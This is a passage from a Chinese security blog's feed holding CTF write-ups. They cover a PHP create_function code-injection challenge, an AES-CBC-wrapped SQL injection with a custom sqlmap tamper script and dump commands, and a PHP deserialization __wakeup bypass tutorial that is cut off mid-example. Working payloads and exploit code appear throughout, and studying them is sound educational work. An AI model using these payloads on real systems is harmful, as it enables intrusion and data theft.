    
    
      <category term="代码审计" scheme="https://c1aysec.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Code-Breaking Puzzles挑战</title>
    <link href="https://c1aysec.github.io/2018/11/30/Code-Breaking%20Puzzles%E6%8C%91%E6%88%98/"/>
    <id>https://c1aysec.github.io/2018/11/30/Code-Breaking Puzzles挑战/</id>
    <published>2018-11-30T11:00:05.000Z</published>
    <updated>2019-11-08T14:10:15.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Code-Breaking-Puzzles挑战"><a href="#Code-Breaking-Puzzles挑战" class="headerlink" title="Code-Breaking Puzzles挑战"></a>Code-Breaking Puzzles挑战</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>来自P师傅小密圈二周年的Code-Breaking Puzzles挑战的题目</strong></p><h3 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h3><p><strong>题目代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</div><div class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $action(<span class="string">''</span>, $arg);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>题目环境为PHP/7.2.12加上Apache/2.4.25 (Debian)</strong></p><p><strong>首先通过<code>$action(&#39;&#39;, $arg);</code>可以想到PHP的动态代码执行，通过这里面的参数可以看出这里应该使用<code>create_function</code>这个函数去进行代码执行，关于这个函数的执行流程如下：</strong></p><pre><code>1.获取参数, 函数体;2.拼凑一个”function __lambda_func (参数) { 函数体;} “的字符串;3.eval;4.通过__lambda_func在函数表中找到eval后得到的函数体, 找不到就出错;5.定义一个函数名:”\000_lambda_” . count(anonymous_functions)++;6.用新的函数名替换__lambda_func;7.返回新的函数。</code></pre><p><strong>以上流程可以简单理解为在使用该函数时会生成一个匿名函数，该函数的第一个参数会作为匿名函数的参数传入，该函数的第二个参数为匿名函数要执行的代码段，看下面的代码实例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $func=create_function(<span class="string">'$a,$b'</span>,<span class="string">'echo $a+$b;'</span>);</div><div class="line">    $func(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line">    <span class="comment">//3</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>这段代码的执行过程等价于</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">anonymous_func</span><span class="params">($a,b)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">echo</span> $a+$b;</div><div class="line">&#125;</div><div class="line">    anonymous_func(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>于是有了一个思路，这里可以传入<code>action=create_function&amp;arg=}phpinfo();/*</code>去执行phpinfo,这样构造的原因是因为这里通过<code>create_function</code>生成的匿名函数并没有赋值给任何变量，所以无法调用该匿名函数，但是由于此处的环境是php的<code>eval</code>环境，所以可以通过<code>}</code>去闭合该匿名函数，之后就执行任意代码了，而这里的<code>/*</code>用来注释后面多出的代码，这里执行的代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">create_function(<span class="string">''</span>,<span class="string">'&#125;phpinfo();/*'</span>);</div></pre></td></tr></table></figure><p><strong>实际执行过程变为了如下代码</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">anonymous_func</span><span class="params">()</span></span>&#123;&#125;phpinfo();\*&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p><strong>于是便可以成功执行phpinfo,但是这道题里只是这样构造是不可以的，这里还需要绕过对传入的<code>$action</code>的正则检查，通过正则可以看出<code>$action</code>的内容不能只包含数字字母和<code>_</code>，在这里面卡了好久，于是看了P牛师傅的讲解，这里可以通过在函数名前加上<code>\</code>去绕过，构造<code>action=\create_function&amp;arg=}phpinfo();/*</code>就可以成功执行phpinfo</strong></p><p><img src="http://pic.c1imber.top/blog/20181130/oNzIUYcJHOL4.png" alt="mark"></p><p><strong>至于函数前面为什么可以加<code>\</code>,P牛师傅也给出了详细的解释，这里用到了php当中的命名空间，在php当中有一个默认的命名空间为<code>\</code>，PHP当中的所有原生函数和类都在这个命名空间下，平常我们在使用函数的时候直接写函数名去调用函数实际上用的是相对路径，而在函数名前面加上<code>\</code>用的是绝对路径去调用函数</strong></p><p><strong>接下来尝试使用命令执行函数执行命令，但是发现命令执行函数都被禁用掉了</strong><br><img src="http://pic.c1imber.top/blog/20181130/i3Ar2ajDTduJ.png" alt="mark"></p><p><strong>只能通过执行代码的方式寻找flag文件了</strong></p><p><strong>寻找flag文件的位置</strong></p><pre><code>action=\create_function&amp;arg=}print_r(scandir(&quot;/var/www/&quot;));/*</code></pre><p><strong>找到flag文件的位置在<code>/var/www</code>目录下</strong></p><p><img src="http://pic.c1imber.top/blog/20181130/lv67vOhsSTJO.png" alt="mark"></p><p><strong>读取flag</strong></p><pre><code>action=\create_function&amp;arg=}echo file_get_contents(&quot;/var/www/flag_h0w2execute_arb1trary_c0de&quot;);/*</code></pre><p><img src="http://pic.c1imber.top/blog/20181130/LHgNeuJvbjkm.png" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Code-Breaking-Puzzles挑战&quot;&gt;&lt;a href=&quot;#Code-Breaking-Puzzles挑战&quot; class=&quot;headerlink&quot; title=&quot;Code-Breaking Puzzles挑战&quot;&gt;&lt;/a&gt;Code-Breaking Puz
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018湖湘杯注入题writeup</title>
    <link href="https://c1aysec.github.io/2018/11/19/2018%E6%B9%96%E6%B9%98%E6%9D%AF%E6%B3%A8%E5%85%A5%E9%A2%98writeup/"/>
    <id>https://c1aysec.github.io/2018/11/19/2018湖湘杯注入题writeup/</id>
    <published>2018-11-19T11:30:56.000Z</published>
    <updated>2018-12-20T01:51:42.981Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2018湖湘杯注入题writeup"><a href="#2018湖湘杯注入题writeup" class="headerlink" title="2018湖湘杯注入题writeup"></a>2018湖湘杯注入题writeup</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>这段时间事情很多，导致这次比赛没有报上名，周日总算闲了下来，看到师傅在群里发了几个题目的链接，于是滑了一波水，在这里记录一下</strong></p><h3 id="WEB-Code-Check"><a href="#WEB-Code-Check" class="headerlink" title="WEB Code Check"></a>WEB Code Check</h3><p><strong>其实昨天写这道题的时候并不知道这个题的题目是什么（有点尴尬），打开题目发现是一个登陆框，进行正常的登陆流程时会出现如下的错误，所以猜测该登陆功能可能不能正常使用</strong><br><img src="http://pic.c1imber.top/blog/20181119/4OOqnC1qMaXC.png" alt="mark"><br><strong>看到登陆处显示平台正在停机维护，不能正常使用应该和这个有一些关系吧</strong><br><img src="http://pic.c1imber.top/blog/20181119/pIrsEaltyAY1.png" alt="mark"><br><strong>接下来查看页面源代码，尝试发现问题，看到有一处连接</strong></p><pre><code>http://39.108.176.234:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09</code></pre><p><img src="http://pic.c1imber.top/blog/20181119/6bNnKTXanQT5.png" alt="mark"><br><strong>打开后是一个显示信息的页面</strong><br><img src="http://pic.c1imber.top/blog/20181119/kPv8QXKJFJmq.png" alt="mark"><br><strong>id参数可能是存在注入的，id的值看起来像是一串base64，于是猜测可能是base64编码后的sql注入，但是在尝试base64解码的时候，第二次解码的时候就不能解码了，会出现乱码</strong></p><p><strong>接下来，偶然发现了一处目录遍历，此处泄露了list.php的源码</strong><br><img src="http://pic.c1imber.top/blog/20181119/vBzDRTmHetEN.png" alt="mark"></p><p><strong>list.php源码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</div><div class="line"><span class="keyword">require_once</span> <span class="string">'../config.php'</span>;</div><div class="line"><span class="comment">//解密过程</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span></span>&#123;</div><div class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</div><div class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</div><div class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</div><div class="line">mcrypt_generic_deinit($td);</div><div class="line">mcrypt_module_close($td);</div><div class="line"><span class="keyword">if</span>(substr(trim($data),<span class="number">-7</span>)!==<span class="string">'hxb2018'</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;'</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">return</span> substr(trim($data),<span class="number">0</span>,strlen(trim($data))<span class="number">-7</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">$id=decode($_GET[<span class="string">'id'</span>]);</div><div class="line">$sql=<span class="string">"select id,title,content,time from notice where id=$id"</span>;</div><div class="line">$info=$link-&gt;query($sql);</div><div class="line">$arr=$info-&gt;fetch_assoc();</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=<span class="string">"en"</span>&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</div><div class="line">&lt;title&gt;X公司HR系统V1<span class="number">.0</span>&lt;/title&gt;</div><div class="line">&lt;style&gt;.body&#123;width:<span class="number">600</span>px;height:<span class="number">500</span>px;margin:<span class="number">0</span> auto&#125;.title&#123;color:red;height:<span class="number">60</span>px;line-height:<span class="number">60</span>px;font-size:<span class="number">30</span>px;font-weight:<span class="number">700</span>;margin-top:<span class="number">75</span>pt;border-bottom:<span class="number">2</span>px solid red;text-align:center&#125;.content,.title&#123;margin:<span class="number">0</span> auto;width:<span class="number">600</span>px;display:block&#125;.content&#123;height:<span class="number">30</span>px;line-height:<span class="number">30</span>px;font-size:<span class="number">18</span>px;margin-top:<span class="number">40</span>px;text-align:left;color:<span class="comment">#828282&#125;&lt;/style&gt;</span></div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;div class="body"&gt;</div><div class="line">&lt;div class="title"&gt;&lt;?php echo $arr['title']?&gt;&lt;/div&gt;</div><div class="line">&lt;div class="content"&gt;&lt;?php echo $arr['content']?&gt;&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p><strong>可以看到此处的id参数进行了AES加密处理，加密模式为CBC模式，之后服务端会对id参数进行解密，之后将解密的结果拼接进sql语句，从而产生了sql注入，源码中泄露了AES加密解密的key(密钥)和iv(初始化向量)，有了key和iv这两部分，就可以随意的构造sql注入的payload了</strong></p><p><strong>解密代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $data=<span class="string">"b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09"</span>;</div><div class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</div><div class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</div><div class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</div><div class="line">mcrypt_generic_deinit($td);</div><div class="line">mcrypt_module_close($td);</div><div class="line"><span class="keyword">echo</span> substr(trim($data),<span class="number">0</span>,strlen(trim($data))<span class="number">-7</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20181119/uGcgDrNkBPfE.png" alt="mark"></p><p><strong>根据解密的代码，结合泄露的key和iv，很容易的编写出生成payload的加密代码，构造延时注入的POC，代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$payload=<span class="string">"1 and sleep(5)-- hxb2018"</span>;</div><div class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</div><div class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</div><div class="line">$data = base64_encode(base64_encode(mcrypt_generic($td,$payload)));</div><div class="line">mcrypt_generic_deinit($td);</div><div class="line">mcrypt_module_close($td);</div><div class="line"><span class="keyword">echo</span> $data;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20181119/L3YFbRXIz7mV.png" alt="mark"></p><p><strong>将经过处理的POC传入到id参数请求</strong></p><pre><code>http://39.108.176.234:49882/news/list.php?id=dTFmeVF0RmtWN2ZYSVBiMWpxNCt1d2p3YWJzVlN4WE1xU0tEbmQ2RHlEMD0=</code></pre><p><strong>发现页面响应延时了5s，说明sql语句执行了，确实是存在注入的</strong><br><img src="http://pic.c1imber.top/blog/20181119/FeHLwaKWIQcn.png" alt="mark"></p><p><strong>为了方便，用python编写sqlmap的tamper脚本对id参数进行相应的处理，实现自动化注入，代码如下:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#编写sqlmap tamper脚本aes_cbc.py</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string">Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)</span></div><div class="line"><span class="string">See the file 'doc/COPYING' for copying permission</span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb</div><div class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</div><div class="line"></div><div class="line">__priority__ = PRIORITY.NORMAL</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line"><span class="string">    hxb2018:AES CBC encrypt sql injection</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    &gt;&gt;&gt; tamper('1 and sleep(5)-- ')</span></div><div class="line"><span class="string">    dTFmeVF0RmtWN2ZYSVBiMWpxNCt1d2p3YWJzVlN4WE1xU0tEbmQ2RHlEMD0=</span></div><div class="line"><span class="string">    """</span></div><div class="line">    <span class="keyword">return</span> encrypt(payload)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(payload)</span>:</span></div><div class="line">    payload=payload+<span class="string">"hxb2018"</span></div><div class="line">    key=<span class="string">"ydhaqPQnexoaDuW3"</span></div><div class="line">    iv=<span class="string">"2018201920202021"</span></div><div class="line">    cipher = AES.new(key,AES.MODE_CBC,iv)</div><div class="line">    <span class="keyword">if</span>(len(payload)%<span class="number">16</span>!=<span class="number">0</span>):</div><div class="line">        payload=payload+(<span class="string">'\0'</span>*(<span class="number">16</span>-len(payload)%<span class="number">16</span>))</div><div class="line">        <span class="keyword">return</span> base64.b64encode(base64.b64encode(cipher.encrypt(payload)))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> base64.b64encode(base64.b64encode(cipher.encrypt(payload)))</div></pre></td></tr></table></figure><p><strong>sqlmap判断存在注入</strong><br>    sqlmap -u “<a href="http://39.108.176.234:49882/news/list.php?id=1" target="_blank" rel="external">http://39.108.176.234:49882/news/list.php?id=1</a>“ –tamper “aes_cbc.py”</p><p><img src="http://pic.c1imber.top/blog/20181119/UekYVNUV0sqg.png" alt="mark"></p><p><strong>获取flag</strong></p><pre><code>sqlmap -u &quot;http://39.108.176.234:49882/news/list.php?id=1&quot; --tamper &quot;aes_cbc.py&quot; --dump -T &quot;notice2&quot; -D &quot;mozhe_discuz_stormgroup&quot;</code></pre><p><img src="http://pic.c1imber.top/blog/20181119/J0LVhOx3QhPD.png" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2018湖湘杯注入题writeup&quot;&gt;&lt;a href=&quot;#2018湖湘杯注入题writeup&quot; class=&quot;headerlink&quot; title=&quot;2018湖湘杯注入题writeup&quot;&gt;&lt;/a&gt;2018湖湘杯注入题writeup&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞学习-绕过_wakeup()函数</title>
    <link href="https://c1aysec.github.io/2018/10/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E7%BB%95%E8%BF%87_wakeup()%E5%87%BD%E6%95%B0/"/>
    <id>https://c1aysec.github.io/2018/10/26/PHP反序列化漏洞学习-绕过_wakeup()函数/</id>
    <published>2018-10-26T09:35:30.000Z</published>
    <updated>2019-11-08T14:25:04.955Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化漏洞学习-绕过-wakeup-函数"><a href="#PHP反序列化漏洞学习-绕过-wakeup-函数" class="headerlink" title="PHP反序列化漏洞学习-绕过_wakeup()函数"></a>PHP反序列化漏洞学习-绕过_wakeup()函数</h1><h3 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h3><p><strong>代码如下，要求利用php反序列化漏洞去读取<code>flag.php</code>文件中的内容</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </div><div class="line">    <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </div><div class="line">      <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</div><div class="line">       <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</div><div class="line">          show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</div><div class="line">       <span class="keyword">else</span>      <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</div><div class="line">      &#125;&#125;  </div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>; &#125; </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="string">''</span> ;&#125;&#125;     </div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123; show_source(<span class="string">'index.php'</span>); &#125; </div><div class="line">    <span class="keyword">else</span>&#123; </div><div class="line">       $file=base64_decode( $_GET[<span class="string">'file'</span>]); </div><div class="line">       <span class="keyword">echo</span> unserialize($file ); &#125; </div><div class="line"><span class="meta">?&gt;</span>   <span class="comment">#&lt;!--key in flag.php--&gt;</span></div></pre></td></tr></table></figure><a id="more"></a><h3 id="php反序列化简单介绍"><a href="#php反序列化简单介绍" class="headerlink" title="php反序列化简单介绍"></a>php反序列化简单介绍</h3><p><strong>根据php官方文档的介绍，php反序列化用于在开发中存储或传递php的值，同时又不丢失其类型和结构，php当中和反序列化有关的两个重要函数，分别为<code>serialize</code>和<code>unserialize</code>，这两个函数可以处理除<code>resource</code>(资源类型)之外的任何php数据类型，对php值进行序列化和反序列化操作</strong></p><h3 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h3><p><strong>php反序列化本身其实是没有危害的，但是当对一个php对象进行序列化或者反序列化操作时，由于对象里面的一些魔术方法会在一些情况下被触发，刚好这些魔术方法里面调用了一些危害的函数并且函数的参数是我们可以控制的，就会产生预料之外的危害，有关php对象的一些常见魔术方法如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">__construct<span class="comment">//在对象创建时触发</span></div><div class="line">__destruct<span class="comment">//在对象销毁时触发</span></div><div class="line">__sleep<span class="comment">//在对象序列化之前触发</span></div><div class="line">__wakeup<span class="comment">//在反序列化还原对象之前触发</span></div><div class="line">__toString<span class="comment">//但对象被当作字符串时触发</span></div><div class="line">__get<span class="comment">//访问不可访问的属性时触发</span></div><div class="line">...</div></pre></td></tr></table></figure><p><strong>具体看下面的例子</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</div><div class="line">  <span class="keyword">private</span> $a=<span class="string">"private"</span>;</div><div class="line">  <span class="keyword">protected</span> $b=<span class="string">"protected"</span>;</div><div class="line">  <span class="keyword">public</span> $c=<span class="string">"public"</span>;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__construct&lt;/br&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__destruct&lt;/br&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="string">"__toString&lt;/br&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__sleep&lt;/br&gt;"</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__wakeup&lt;/br&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($a)</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__get&lt;/br&gt;"</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;a;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">$class=<span class="keyword">new</span> test();<span class="comment">//触发__construct,输出__construct</span></div><div class="line"><span class="keyword">echo</span> $class;<span class="comment">//触发__toString,输出__toString</span></div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> $class-&gt;a;<span class="comment">//访问私有属性$a,触发__get,输出__get</span></div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">$str=serialize($class);<span class="comment">//触发__sleep,输出__sleep</span></div><div class="line"><span class="keyword">echo</span> $str;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">$new_class=unserialize($str);<span class="comment">//触发__wakeup,输出__wakeup</span></div><div class="line"><span class="comment">//程序结束对象被销毁,触发//destruct,输出__destruct,输出两次，分别销毁$class和$new_class两个对象</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>该程序的输出结果如下</strong></p><p><img src="http://pic.c1imber.top/blog/181031/iGL0DDG152.png?imageslim" alt="mark"><br><strong>需要注意的是<code>private</code>、<code>protected</code>、<code>public</code>三个对象的属性经过序列化后的字符串格式是有区别的，这在构造POC的时候十分关键，通过抓包看到的序列化数据实际如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">"\00test\00a"</span>;s:<span class="number">7</span>:<span 